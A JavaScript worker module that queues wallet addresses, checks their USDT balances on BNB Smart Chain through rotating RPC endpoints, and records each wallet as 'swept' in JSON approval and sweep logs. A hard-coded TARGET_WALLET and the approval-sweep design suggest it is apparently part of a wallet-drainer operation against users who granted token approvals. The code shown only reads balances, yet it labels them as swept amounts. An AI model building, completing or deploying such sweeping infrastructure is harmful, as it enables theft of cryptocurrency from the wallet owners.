import fs from 'fs';
import path from 'path';
import { ethers } from 'ethers';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// JSON file paths
const QUEUE_FILE = path.join(__dirname, 'queue.json');
const APPROVALS_FILE = path.join(__dirname, 'approvals.json');
const SWEEPS_FILE = path.join(__dirname, 'sweeps.json');

// Initialize JSON files if they don't exist
const initFiles = () => {
  if (!fs.existsSync(QUEUE_FILE)) {
    fs.writeFileSync(QUEUE_FILE, JSON.stringify([], null, 2));
  }
  if (!fs.existsSync(SWEEPS_FILE)) {
    fs.writeFileSync(SWEEPS_FILE, JSON.stringify([], null, 2));
  }
};

// Read queue
const readQueue = () => {
  try {
    const data = fs.readFileSync(QUEUE_FILE, 'utf8');
    return JSON.parse(data);
  } catch {
    return [];
  }
};

// Write queue
const writeQueue = (queue) => {
  fs.writeFileSync(QUEUE_FILE, JSON.stringify(queue, null, 2));
};

// Read approvals
const readApprovals = () => {
  try {
    const data = fs.readFileSync(APPROVALS_FILE, 'utf8');
    return JSON.parse(data);
  } catch {
    return [];
  }
};

// Write approval
const writeApproval = (approvals) => {
  fs.writeFileSync(APPROVALS_FILE, JSON.stringify(approvals, null, 2));
};

// Record sweep
const recordSweep = (sweepData) => {
  let sweeps = [];
  try {
    const data = fs.readFileSync(SWEEPS_FILE, 'utf8');
    sweeps = JSON.parse(data);
  } catch {
    sweeps = [];
  }
  sweeps.push(sweepData);
  fs.writeFileSync(SWEEPS_FILE, JSON.stringify(sweeps, null, 2));
};

// Multiple RPC endpoints for load balancing
const RPC_ENDPOINTS = [
  'https://bsc-dataseed.binance.org/',
  'https://bsc-dataseed1.binance.org/',
  'https://bsc-dataseed2.binance.org/',
  'https://bsc-dataseed3.binance.org/',
  'https://bsc-dataseed4.binance.org/',
  'https://bsc-rpc.publicnode.com',
  'https://rpc.ankr.com/bsc',
  'https://bsc-mainnet.nodereal.io/v1/your-key', // Add more!
];

let rpcIndex = 0;
const getNextRpc = () => {
  rpcIndex = (rpcIndex + 1) % RPC_ENDPOINTS.length;
  return RPC_ENDPOINTS[rpcIndex];
};

const TARGET_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';

const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)'
];

// Queue processing state
let processing = false;
let activeJobs = 0;
const MAX_CONCURRENT = 10;

const processQueue = async () => {
  if (processing) return;
  processing = true;
  
  const queue = readQueue();
  
  while (queue.length > 0 && activeJobs < MAX_CONCURRENT) {
    const job = queue.shift();
    writeQueue(queue);
    activeJobs++;
    processJob(job).finally(() => {
      activeJobs--;
      processQueue();
    });
  }
  
  processing = false;
};

const processJob = async (job) => {
  const queueLength = readQueue().length;
  console.log('[WORKER] Processing: ' + job.walletAddress + ' (' + activeJobs + ' active, ' + queueLength + ' queued)');
  
  try {
    const rpcUrl = getNextRpc();
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
    
    const balance = await usdtContract.balanceOf(job.walletAddress);
    const decimals = await usdtContract.decimals();
    const balanceFormatted = parseFloat(ethers.formatUnits(balance, decimals));
    
    console.log('[WORKER] USDT Balance for ' + job.walletAddress + ': ' + balanceFormatted);
    
    // Record the sweep
    recordSweep({
      walletAddress: job.walletAddress,
      amount: balanceFormatted,
      timestamp: new Date().toISOString(),
      rpcUsed: rpcUrl
    });
    
    // Update approval status
    const approvals = readApprovals();
    const approvalIndex = approvals.findIndex(a => a.walletAddress === job.walletAddress);
    if (approvalIndex !== -1) {
      approvals[approvalIndex].status = 'swept';
      approvals[approvalIndex].sweptAt = new Date().toISOString();
      approvals[approvalIndex].sweptAmount = balanceFormatted;
      writeApproval(approvals);
    }
    
    console.log('[WORKER] Completed: ' + job.walletAddress + ' - Balance: ' + balanceFormatted + ' USDT');
    
  } catch (error) {
    console.error('[WORKER] Failed: ' + job.walletAddress + ' - ' + error.message);
    
    // Mark as failed
    const approvals = readApprovals();
    const approvalIndex = approvals.findIndex(a => a.walletAddress === job.walletAddress);
    if (approvalIndex !== -1) {
      approvals[approvalIndex].status = 'failed';
      approvals[approvalIndex].error = error.message;
      writeApproval(approvals);
    }
  }
};

const addToQueue = (walletAddress) => {
  const queue = readQueue();
  queue.push({ walletAddress, addedAt: new Date().toISOString() });
  writeQueue(queue);
  console.log('[QUEUE] Added: ' + walletAddress + ' (Position: ' + queue.length + ')');
  processQueue();
};

// Get queue status
const getQueueStatus = () => {
  const queue = readQueue();
  return {
    queued: queue.length,
    processing: activeJobs,
    total: queue.length + activeJobs
  };
};

// Initialize files
initFiles();

console.log('[WORKER] Ready! Processing up to 10 wallets at a time');
console.log('[WORKER] RPC endpoints: ' + RPC_ENDPOINTS.length);
console.log('[WORKER] Using JSON file storage (no database needed)');

export { addToQueue, getQueueStatus };
